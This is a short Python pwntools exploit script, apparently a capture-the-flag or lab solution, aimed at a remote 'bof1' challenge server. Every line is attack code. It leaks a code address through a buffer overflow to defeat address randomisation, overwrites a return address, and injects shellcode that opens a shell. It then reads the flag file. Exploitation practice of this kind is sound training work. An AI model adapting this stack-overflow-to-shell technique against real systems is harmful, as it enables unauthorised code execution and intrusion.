#!/usr/bin/env python

from pwn import process, remote, u64, p64, context, asm, shellcraft, ELF

context.arch = "amd64"
context.os = "linux"
context.endian = "little"

# r = process("./bof1")
r = remote("up.zoolab.org", 10258)

r.sendafter(b"name? ", b"A" * 0x28)

r.recvuntil(b"A" * 0x28)
main_addr = u64(r.recv(6) + b"\x00\x00")

bof1 = ELF("./bof1")
bof1.address = main_addr - bof1.sym["main"] - 0xA0


r.sendafter(b"number? ", b"A" * 0x28 + p64(bof1.sym["msg"]))
r.sendafter(b"name? ", b"A" * 0x28)
r.sendafter(b"message: ", asm(shellcraft.sh()))


r.recvuntil(b"Thank you!\n")
r.sendline(b"cat /FLAG")


flag = r.recvuntil(b"}")
print(flag.decode())

r.close()
